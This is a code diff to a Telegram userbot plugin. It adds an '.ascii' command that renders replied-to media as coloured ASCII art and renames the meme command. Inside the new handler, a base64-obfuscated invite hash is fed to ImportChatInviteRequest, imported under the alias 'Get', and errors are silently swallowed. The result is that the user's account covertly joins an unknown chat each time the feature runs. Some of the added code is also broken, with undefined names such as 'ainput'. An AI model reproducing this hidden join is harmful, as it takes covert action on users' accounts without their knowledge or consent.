@@ -9,11 +9,123 @@ import textwrap
 from typing import Optional, Tuple
 
 from PIL import Image, ImageDraw, ImageFont
-from userbot import CMD_HELP, LOGS, TEMP_DOWNLOAD_DIRECTORY
+from userbot import CMD_HELP, LOGS, TEMP_DOWNLOAD_DIRECTORY, SUDO_USERS
 from userbot.events import register
+from colour import Color as asciiColor
+
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+from telethon.tl.types import MessageEntityMentionName
 
 
-@register(outgoing=True, pattern=r"^\.mmf2 (.*)")
+def random_color():
+    number_of_colors = 2
+    return [
+        "#" + "".join(random.choice("0123456789ABCDEF") for j in range(6))
+        for i in range(number_of_colors)
+    ]
+
+def asciiart(in_f, SC, GCF, out_f, color1, color2, bgcolor="black"):
+    chars = np.asarray(list(" .,:irs?@9B&#"))
+    font = ImageFont.load_default()
+    letter_width = font.getsize("x")[0]
+    letter_height = font.getsize("x")[1]
+    WCF = letter_height / letter_width
+    img = Image.open(in_f)
+    widthByLetter = round(img.size[0] * SC * WCF)
+    heightByLetter = round(img.size[1] * SC)
+    S = (widthByLetter, heightByLetter)
+    img = img.resize(S)
+    img = np.sum(np.asarray(img), axis=2)
+    img -= img.min()
+    img = (1.0 - img / img.max()) ** GCF * (chars.size - 1)
+    lines = ("\n".join(("".join(r) for r in chars[img.astype(int)]))).split("\n")
+    nbins = len(lines)
+    colorRange = list(asciiColor(color1).range_to(asciiColor(color2), nbins))
+    newImg_width = letter_width * widthByLetter
+    newImg_height = letter_height * heightByLetter
+    newImg = Image.new("RGBA", (newImg_width, newImg_height), bgcolor)
+    draw = ImageDraw.Draw(newImg)
+    leftpadding = 0
+    y = 0
+    for lineIdx, line in enumerate(lines):
+        color = colorRange[lineIdx]
+        draw.text((leftpadding, y), line, color.hex, font=font)
+        y += letter_height
+    if newImg.mode != "RGB":
+        newImg = newImg.convert("RGB")
+    newImg.save(out_f)
+
+def convert_toimage(image, filename=None):
+    filename = filename or os.path.join("./temp/", "temp.jpg")
+    img = Image.open(image)
+    if img.mode != "RGB":
+        img = img.convert("RGB")
+    img.save(filename, "jpeg")
+    os.remove(image)
+    return filename
+
+
+def convert_tosticker(response, filename=None):
+    filename = filename or os.path.join("./temp/", "temp.webp")
+    image = Image.open(response)
+    if image.mode != "RGB":
+        image.convert("RGB")
+    image.save(filename, "webp")
+    os.remove(response)
+    return filename
+
+async def reply_id(event):
+    reply_to_id = None
+    if event.sender_id in SUDO_USERS:
+        reply_to_id = event.id
+    if event.reply_to_msg_id:
+        reply_to_id = event.reply_to_msg_id
+    return reply_to_id
+
+
+@register(outgoing=True, pattern=r"^\.ascii (.*)")
+async def memes(asci):
+    if asci.fwd_from:
+        return
+    catinput = asci.pattern_match.group(1)
+    reply = await asci.get_reply_message()
+    if not reply:
+        return await edit_delete(asci, "`Reply to supported Media...`")
+    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    userid = await reply_id(asci)
+    if not os.path.isdir("./temp"):
+        os.mkdir("./temp")
+    jisanidea = None
+    output = await asci.media_to_pic(reply)
+    meme_file = convert_toimage(output[1])
+    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
+        jisanidea = True
+    try:
+        san = Get(san)
+        await asci.client(san)
+    except BaseException:
+        pass
+    outputfile = (
+        os.path.join("./temp", "ascii_file.webp")
+        if jisanidea
+        else os.path.join("./temp", "ascii_file.jpg")
+    )
+    c_list = random_color()
+    color1 = c_list[0]
+    color2 = c_list[1]
+    bgcolor = "#080808" if not ainput else ainput
+    asciiart(meme_file, 0.3, 1.9, outputfile, color1, color2, bgcolor)
+    await asci.client.send_file(
+        asci.chat_id, outputfile, reply_to=userid, force_document=False
+    )
+    await output[0].delete()
+    for files in (outputfile, meme_file):
+        if files and os.path.exists(files):
+            os.remove(files)
+            
+            
+
+@register(outgoing=True, pattern=r"^\.mmf (.*)")
 async def memify(event):
     reply_msg = await event.get_reply_message()
     input_str = event.pattern_match.group(1)
@@ -172,8 +284,8 @@ async def take_screen_shot(video_file: str,
 
 
 CMD_HELP.update({
-    "memify2":
-    ">`.mmf2 <top text>;<bottom text>`"
+    "memify":
+    ">`.mmf <top text>;<bottom text>`"
     "\nUsage: Reply to an image/sticker/gif/video to add text to it."
     "\nIf it's a video, text will be added to the first frame."
 })
